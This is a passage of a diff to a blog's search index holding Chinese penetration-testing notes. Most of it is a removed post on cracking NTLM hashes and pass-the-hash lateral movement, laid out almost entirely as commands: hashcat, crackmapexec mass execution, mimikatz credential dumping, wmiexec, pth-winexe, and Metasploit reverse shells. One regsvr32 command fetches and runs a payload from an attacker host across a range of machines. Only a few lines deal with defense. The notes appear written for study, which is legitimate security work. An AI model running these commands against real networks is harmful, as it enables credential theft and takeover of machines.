-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LM：3000 </span><br><span class="line">NTLM：1000</span><br><span class="line">NetNTLMv1：5500</span><br><span class="line">NetNTLMv2：5600</span><br></pre></td></tr></table></figure>
-
-<p>NTLMv1的格式为：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>
-
-<p>构造后的数据如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</span><br></pre></td></tr></table></figure>
-
-<p>Hashcat参数如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
-
-<p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p>
-</blockquote>
-<h4 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h4><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。</p>
-<p>常用<code>Pass-The-Hash</code>工具： </p>
-<ul>
-<li>Crackmapexec</li>
-<li>Mimikatz</li>
-<li>smbmap</li>
-<li>smbexec</li>
-<li>metasploit</li>
-<li>cobaltstrike</li>
-</ul>
-<h5 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></h5><p>1.安装 crackmapexec</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br><span class="line">(pip install crackmapexec)</span><br></pre></td></tr></table></figure>
-
-<p>2.使用 crackmapexec</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cme smb -h</span><br></pre></td></tr></table></figure>
-
-<p>批量扫描探测命令：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>/<span class="number">24</span></span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span> -u administrator -H hash.txt</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.100</span><span class="number">-200</span> -u administrator -H AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>
-
-<p>执行命令：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -p toor(明文密码) -x whoami</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -H afc44ee7351d61d00698796da06b1ebf -x whoami</span><br></pre></td></tr></table></figure>
-
-<p>其他参数</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--shares    <span class="comment">#枚举共享和访问权限</span></span><br><span class="line">--sessions    <span class="comment">#枚举活动会话</span></span><br><span class="line">--disks        <span class="comment">#枚举磁盘</span></span><br><span class="line">--sam         <span class="comment">#dump目标系统中的SAM哈希值</span></span><br><span class="line">--loggedon-users    <span class="comment">#枚举登录用户</span></span><br><span class="line">--users [USER]        <span class="comment">#枚举域用户(如果指定了用户只查询其信息)</span></span><br><span class="line">--groups [GROUP]        <span class="comment">#枚举域组(如果指定了组其成员被列举)</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]  <span class="comment">#如果指定了组则枚举本地组其成员被列举</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]    <span class="comment">#枚举本地组，如果指定了组，则枚举其成员</span></span><br><span class="line">-x COMMAND                <span class="comment">#执行指定的命令</span></span><br><span class="line">-X PS_COMMAND            <span class="comment">#执行指定的PowerShell命令</span></span><br><span class="line"></span><br><span class="line">-L， --list-modules    <span class="comment">#列出可用的拓展功能模块</span></span><br><span class="line">--options    <span class="comment">#查看模块选项</span></span><br><span class="line">-M MODULE， --module MODULE     <span class="comment">#使用拓展功能模块</span></span><br><span class="line">-o MODULE_OPTION [MODULE_OPTION ...] <span class="comment">#设置模块选项</span></span><br></pre></td></tr></table></figure>
-
-<p>GETSHELL</p>
-<p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/usr/local/lib/python2<span class="number">.7</span>/dist-packages/crackmapexec<span class="number">-4.0</span><span class="number">.1</span>.dev0-py2<span class="number">.7</span>.egg/cme/modules</span><br></pre></td></tr></table></figure>
-
-<p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cme smb -M met_inject --options</span><br><span class="line">[*] met_inject module options:</span><br><span class="line">    LHOST    IP hosting the handler</span><br><span class="line">    LPORT    Handler port</span><br><span class="line">    PAYLOAD  Payload to inject: reverse_http or reverse_https (default:reverse_https)</span><br><span class="line">    PROCID   Process ID to inject into (default: current powershell process)</span><br></pre></td></tr></table></figure>
-
-<p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">cme<span class="built_in"> smb </span>17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o <span class="attribute">LHOST</span>=17.10.0.1 <span class="attribute">LPORT</span>=9999</span><br></pre></td></tr></table></figure>
-
-<p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p>
-<p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 17.10.0.1</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 17.10.0.1:9999 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1KZkey</span><br><span class="line">[*] Local IP: http://10.204.146.152:8080/1KZkey</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll</span><br></pre></td></tr></table></figure>
-
-<p>通过pass-the-hash执行命令批量getshell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h5><p>search <code>psexec</code>，<code>smblogin</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>
-
-<p>举例：</p>
-<h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h5><p>先抓取hash</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords<span class="string">""</span></span><br></pre></td></tr></table></figure>
-
-<p>得到hash之后：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>
-
-<h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a></h5><p>exe 版本下载<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">链接</a></p>
-<p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p>
-<p>严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。</p>
-<p>只能说很多工具吧，比较好用的在这里介绍两种：</p>
-<p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
-<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">17.10</span>.<span class="number">0.10</span> <span class="literal">-Domain</span> test.local <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> AFC44EE7351D61D00698796DA06B1EBF <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
-
-<p>Invoke-SMBExec</p>
-<p>通过在目标主机创建服务执行命令，所以权限为system</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">192.168</span>.<span class="number">0.2</span> <span class="literal">-Domain</span> ssookinging<span class="literal">-pc</span> <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> <span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Invoke-SMBClient："><a href="#Invoke-SMBClient：" class="headerlink" title="Invoke-SMBClient："></a>Invoke-SMBClient：</h5><p>支持SMB1, SMB2 (2.1), and SMB signing</p>
-<p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p>
-<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Invoke-SMBExec -Target 192.168.0.102 -Domain workgroup -Username administrator -Hash 03bebb338e70244589ea67c7439c77ba -Command <span class="string">"notepad.exe"</span> -verbose</span><br></pre></td></tr></table></figure>
-
-<h5 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h5><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe</span><br><span class="line"></span><br><span class="line">pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h3><p>结合攻击方法，总结防御思路如下：</p>
-<ul>
-<li>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径</li>
-<li>如无特殊需要，建议配置防火墙规则禁止139和445端口</li>
-</ul>
-<h3 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h3><ul>
-<li>内网欺骗劫持</li>
-<li>钓鱼文件</li>
-<li>后门命令</li>
-<li>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</li>
-<li><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></li>
-<li>获取域控</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf&gt; run post/windows/gather/credentials/gpp</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>内网与域渗透学习</category>
-      </categories>
-      <tags>
-        <tag>NTML</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>敏感信息泄露常见类型</title>
     <url>/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/</url>
-    <content><![CDATA[<h2 id="敏感信息泄露-源码泄露-学习笔记"><a href="#敏感信息泄露-源码泄露-学习笔记" class="headerlink" title="敏感信息泄露/源码泄露  学习笔记"></a>敏感信息泄露/源码泄露  学习笔记</h2><h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p>
+    <content><![CDATA[<h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p>
 <h4 id="1、-git文件泄露漏洞"><a href="#1、-git文件泄露漏洞" class="headerlink" title="1、.git文件泄露漏洞"></a>1、.git文件泄露漏洞</h4><p><strong>漏洞描述：</strong>git在初始化项目的时候，会在项目的根目录（git rev-parse  –show-toplevel查看）创建一个名为<code>.git</code>的隐藏文件夹，里面包含了本地所有commit的历史纪录，如果无意间将这个目录置于Web的路径下让用户可以访问，那么也就泄露了几乎所有的源代码和其他的敏感信息。可能泄露的内容：</p>
 <ul>
 <li>所有该项目的源码</li>
@@ -5764,7 +5418,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>命令执行/代码执行漏洞学习</title>
     <url>/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/</url>
-    <content><![CDATA[<h2 id="代码执行-命令执行漏洞学习笔记-靶场实战"><a href="#代码执行-命令执行漏洞学习笔记-靶场实战" class="headerlink" title="代码执行+命令执行漏洞学习笔记+靶场实战"></a>代码执行+命令执行漏洞学习笔记+靶场实战</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="一、什么是命令执行漏洞"><a href="#一、什么是命令执行漏洞" class="headerlink" title="一、什么是命令执行漏洞"></a>一、什么是命令执行漏洞</h4><h5 id="命令执行漏洞概念："><a href="#命令执行漏洞概念：" class="headerlink" title="命令执行漏洞概念："></a>命令执行漏洞概念：</h5><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+    <content><![CDATA[<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="一、什么是命令执行漏洞"><a href="#一、什么是命令执行漏洞" class="headerlink" title="一、什么是命令执行漏洞"></a>一、什么是命令执行漏洞</h4><h5 id="命令执行漏洞概念："><a href="#命令执行漏洞概念：" class="headerlink" title="命令执行漏洞概念："></a>命令执行漏洞概念：</h5><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
 <h5 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul>
 <li>继承web服务器程序的权限，去执行系统命令。</li>
 <li>继承web服务器程序的权限，读取文件</li>
@@ -5921,7 +5575,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>文件上传漏洞学习</title>
     <url>/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
+    <content><![CDATA[<h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
 <p><strong>关于PHP中$_FILES数组的使用方法</strong></p>
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘name’</span>] 客户端文件名称</span><br><span class="line"></span><br><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘type’</span>] 文件的MIME类型</span><br><span class="line"></span><br><span class="line">$_FILES\[<span class="string">‘file’</span>][<span class="symbol">‘size’</span>] 文件大小 单位字节</span><br><span class="line"></span><br><span class="line">$<span class="emphasis">_FILES\[‘file’][‘tmp_</span>name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</span><br></pre></td></tr></table></figure>
 
@@ -6284,7 +5938,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>文件包含漏洞学习笔记</title>
     <url>/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/</url>
-    <content><![CDATA[<h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
+    <content><![CDATA[<h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
 <h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul>
 <li>require()</li>
 <li>require_once()</li>
@@ -6589,7 +6243,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>浅析黄金票据与白银票据</title>
     <url>/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</url>
-    <content><![CDATA[<h2 id="浅析黄金票据与白银票据"><a href="#浅析黄金票据与白银票据" class="headerlink" title="浅析黄金票据与白银票据"></a>浅析黄金票据与白银票据</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用<strong>黄金票据</strong>和<strong>白银票据</strong>，通过PtT访问主机相当简单。</p>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用<strong>黄金票据</strong>和<strong>白银票据</strong>，通过PtT访问主机相当简单。</p>
 <h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>我们首先需要学习关于kerberos认证</p>
 <ul>
 <li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li>
@@ -8623,7 +8277,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>windows中常见提权方式总结(一)</title>
     <url>/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/</url>
-    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="windows提权——本地提权"><a href="#windows提权——本地提权" class="headerlink" title="windows提权——本地提权"></a>windows提权——本地提权</h3><ul>
+    <content><![CDATA[<h3 id="windows提权——本地提权"><a href="#windows提权——本地提权" class="headerlink" title="windows提权——本地提权"></a>windows提权——本地提权</h3><ul>
 <li>已实现本地低权限账号登录<ul>
 <li>远程溢出</li>
 <li>直接获得账号密码</li>
@@ -9004,7 +8658,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>windows渗透测试中常见提权方式总结(二)</title>
     <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</url>
-    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（二）"><a href="#渗透测试中常见提权方式总结（二）" class="headerlink" title="渗透测试中常见提权方式总结（二）"></a>渗透测试中常见提权方式总结（二）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql提权概述"><a href="#mysql提权概述" class="headerlink" title="mysql提权概述"></a>mysql提权概述</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul>
+    <content><![CDATA[<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql提权概述"><a href="#mysql提权概述" class="headerlink" title="mysql提权概述"></a>mysql提权概述</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul>
 <li><strong>功能型：</strong>udf提权</li>
 <li><strong>技巧型：</strong>启动项提权</li>
 <li><strong>漏洞型：</strong>mof提权</li>
